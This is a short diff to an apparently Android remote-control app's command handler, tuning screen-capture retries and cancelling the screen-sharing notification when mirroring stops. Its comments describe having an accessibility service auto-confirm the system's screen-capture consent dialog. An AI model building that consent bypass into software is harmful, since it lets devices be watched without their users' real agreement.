@@ -139,6 +139,10 @@ object CommandHandler {
                 } else {
                     // No capture permission (e.g. after reboot) — pop the consent dialog
                     // (auto-confirmed by accessibility); next attempt will succeed.
+                    // Capture window stamp: MirrorService freshly-granted session ko
+                    // ~20 s tak zinda rakhta hai taki RETRY par frame mil jaye —
+                    // uske baad idle session khud release (cast icon na bache).
+                    Store.pendingCaptureAt = android.os.SystemClock.elapsedRealtime()
                     requestProjectionConsent(ctx)
                     data.addProperty("error", "no permission — consent auto-requested, retry shortly")
                     Pair(false, data)
@@ -203,9 +207,15 @@ object CommandHandler {
                 // auto-confirm kar dega (~1-2 s), phir frames turant chalenge.
                 MirrorManager.stopStreaming()
                 Store.pendingMirrorFps = -1
+                Store.pendingCaptureAt = 0L // capture window bhi band — idle watchdog turant release kare
                 Store.projectionRequestedAt = 0L // in-flight consent state clear — agla start turant fresh dialog kholega
                 MirrorManager.release()
                 runCatching { ctx.stopService(Intent(ctx, MirrorService::class.java)) }
+                // Belt & braces: "Screen sharing active" notification (id 2) —
+                // stopService race me bhi drawer se turant gayab.
+                runCatching {
+                    (ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).cancel(2)
+                }
                 sendMirrorState(false)
                 Pair(true, data)
             }
